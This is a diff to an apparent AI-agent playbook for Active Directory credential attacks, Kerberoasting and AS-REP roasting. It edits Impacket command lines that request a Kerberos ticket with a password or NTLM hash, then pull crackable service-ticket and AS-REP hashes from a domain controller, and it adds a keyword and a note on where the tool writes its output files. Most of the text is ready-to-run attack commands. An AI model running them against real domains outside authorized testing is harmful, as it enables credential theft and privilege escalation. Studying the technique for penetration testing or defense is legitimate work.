@@ -5,6 +5,7 @@ description: >
   hashes (AS-REP Roasting) for offline password recovery.
 keywords:
   - kerberoast
+  - kerberoasting
   - asreproast
   - AS-REP
   - GetUserSPNs
@@ -90,16 +91,20 @@ and records state changes. Your return summary must include:
 
 ```bash
 # Get a TGT first
-getTGT.py DOMAIN/user:'Password123'@DC.DOMAIN.LOCAL
+cd $TMPDIR && getTGT.py DOMAIN/user:'Password123' -dc-ip DC_IP
 # or with NTLM hash
-getTGT.py DOMAIN/user@DC.DOMAIN.LOCAL -hashes :NTHASH
+cd $TMPDIR && getTGT.py DOMAIN/user -hashes :NTHASH -dc-ip DC_IP
 
-export KRB5CCNAME=user.ccache
+export KRB5CCNAME=$TMPDIR/user.ccache
 
 # All Impacket roasting tools support -k -no-pass
-GetUserSPNs.py DOMAIN/user@DC.DOMAIN.LOCAL -k -no-pass -request
-GetNPUsers.py DOMAIN/user@DC.DOMAIN.LOCAL -k -no-pass
+GetUserSPNs.py DOMAIN/user@DC.DOMAIN.LOCAL -k -no-pass -dc-ip DC_IP -request
+GetNPUsers.py DOMAIN/user@DC.DOMAIN.LOCAL -k -no-pass -dc-ip DC_IP
 ```
+
+**Tool output directory**: `getTGT.py` writes `<user>.ccache` to CWD with no
+`-out` flag. Always prefix with `cd $TMPDIR &&`. TGS/AS-REP hash output files
+(via `-outputfile`) support explicit paths.
 
 ## Privileged Commands
 
